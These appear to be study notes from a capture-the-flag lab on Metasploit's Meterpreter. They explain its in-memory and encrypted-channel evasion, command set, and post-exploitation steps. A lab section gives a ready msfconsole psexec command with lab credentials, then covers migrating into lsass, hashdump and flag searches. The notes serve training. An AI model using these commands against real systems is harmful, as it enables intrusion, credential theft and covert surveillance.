# Metasploit: Meterpreter
## Intro
### 1. What is Meterpreter?

Meterpreter is an advanced Metasploit payload that acts as an agent in a command-and-control architecture. It allows attackers to interact seamlessly with a target's operating system, manage files, and execute specialized post-exploitation commands.

### 2. In-Memory Execution (Disk Evasion)

Meterpreter runs entirely within the target system's memory (RAM) and never writes itself to the physical disk. By not creating a malicious executable file (like meterpreter.exe), it successfully evades many traditional Antivirus (AV) scanners that rely on checking newly downloaded files.

### 3. Encrypted Communications (Network Evasion)

To avoid being blocked by network security tools, Meterpreter uses encrypted communication channels (like HTTPS) to talk back to the attacker's machine. This allows it to slip past Intrusion Detection Systems (IDS) and Intrusion Prevention Systems (IPS) if the organization does not decrypt and inspect its internal traffic.

### 4. Process Disguise

Once inside the system, Meterpreter masks its presence by running inside legitimate system processes. For example, using the getpid and ps commands might show Meterpreter hiding inside a standard Windows process like spoolsv.exe. Even inspecting the loaded DLLs for that process will not reveal obvious indicators of compromise.

## Meterpreter Flavors
* Payload Categories: Payloads are divided into staged (sent in two steps: an initial small "stager" that downloads the rest) and inline/single (sent completely in one step). Meterpreter offers both types.
* Platform Support: Meterpreter has different variations built for various environments, including Windows, Linux, macOS, Android, Apple iOS, Java, PHP, and Python.
* How to Choose: Your payload selection depends on three main factors:
    * The target's operating system.
    * Available components on the target (e.g., is Python installed? Is it a PHP server?).
    * Allowed network connections (e.g., raw TCP, HTTPS, or IPv6).
* Discovering Payloads:
    * From the standard terminal: Use `msfvenom --list payloads | grep meterpreter` to see all available versions.
    * Inside `msfconsole`: Type `show payloads` while inside an exploit module to see compatible options (note that some exploits have default Meterpreter payloads pre-configured).

## Meterpreter Commands
### 1. The `help` Command & Built-in Tools
* Typing `help` inside an active `meterpreter >` prompt is the most important step, as it lists all available commands for your specific payload.
* Meterpreter commands are built-in tools that run directly in memory on the target system without needing to upload additional executable files.
* Available commands will differ depending on the Meterpreter version you are using (e.g., Windows vs. Linux).

### 2. Key Command Categories
* Core Commands: Used to manage the session itself. Essential commands include `background` (to detach without killing the session), `migrate` (to move the payload into a different process like `lsass.exe`), `load` (to add extensions), and `sessions` (to switch between targets).
* File System Commands: Tools for navigating and modifying the target's files, utilizing familiar syntax like `ls`, `cd`, `pwd`, `cat`, `upload`, `download`, and `search`.
* Networking Commands: Used to enumerate and pivot through the target's network. Includes `ifconfig`, `netstat`, `route`, and `portfwd` for forwarding local ports to remote services.
* System Commands: Interact directly with the host OS. Important commands include `sysinfo` (displays OS and architecture), `getuid` (shows the current user context), `getpid` / `ps` (for process management), and `shell` (drops you into a standard system command prompt).

### 3. Specialized Post-Exploitation Commands
* Privilege & Credentials: `getsystem` attempts automatic privilege escalation to the local SYSTEM account, while `hashdump` extracts the password database (like SAM hashes on Windows).
* Surveillance: Depending on the target's hardware and desktop environment, you can use commands like `screenshot`, `screenshare`, `record_mic`, and `webcam_snap`. Note that these will fail if the target lacks the necessary components (e.g., running on a headless server).

## Post-Exploitation with Meterpreter
Key Meterpreter Commands for Post-Exploitation:

* `help`: Lists all available Meterpreter commands for your specific payload version. It is the best way to quickly browse the options you have available.
* `getuid`: Displays the current user context that Meterpreter is running under (e.g., NT AUTHORITY\SYSTEM or a standard user). This tells you your current privilege level on the target.
* `ps`: Lists all running processes on the target machine, including their Process IDs (PIDs), user contexts, and architectures.
* `migrate <PID>`: Moves your active Meterpreter session into another running process. This is useful for increasing session stability, hiding from defenders, or capturing keystrokes from specific applications (like a word processor). Note: Migrating to a lower-privileged process may cause you to lose your elevated privileges.
* `hashdump`: Extracts the contents of the SAM (Security Account Manager) database on Windows systems. This provides the NTLM password hashes for local users, which can be used for offline cracking or Pass-the-Hash attacks.
* `search -f <filename>`: Locates specific files across the target's file system. It is especially useful for finding flags in CTFs or sensitive files like password configurations during a penetration test.

## Post-Exploitation Chalenge
### 1. Challenge Objective
* Task 5 is a practical challenge where you apply previously learned post-exploitation techniques on a provided target machine.
* Initial access is simulated using the `exploit/windows/smb/psexec` module with provided SMB credentials (`ballen` / `Password1`).

```
msfconsole -qx "use exploit/windows/smb/psexec; set RHOSTS 10.49.133.220; set SMBUser ballen; set SMBPass Password1; set LHOST 10.49.67.23; run"
```

### 2. System & Network Enumeration
* System Info: Using the `sysinfo` command to gather basic target details, such as the computer name.
* Post-Exploitation Modules: Backgrounding the active session to run Metasploit enumeration modules like `post/windows/gather/enum_domain` to find the domain (FLASH) and `post/windows/gather/enum_shares` to discover user-created network shares.

### 3. Credential Harvesting (Hashdump)
* To extract password hashes from the system, you must first locate the Local Security Authority Subsystem Service.
* You use `ps` to find the Process ID (PID) for `lsass.exe`, `run migrate <PID>` to move your Meterpreter session into that process, and then execute hashdump to extract NTLM hashes.

### 4. File Searching & Pillaging
* Utilizing Meterpreter's search capabilities to locate hidden sensitive files on the file system.
* Use `search -f secrets.txt` to find the exact path of the flag files (e.g., inside C:\Program Files (x86)\Windows Multimedia Platform\), and then use the cat command to read their contents and extract the final secrets and passwords.
* Do same thing to search `secret.txt`

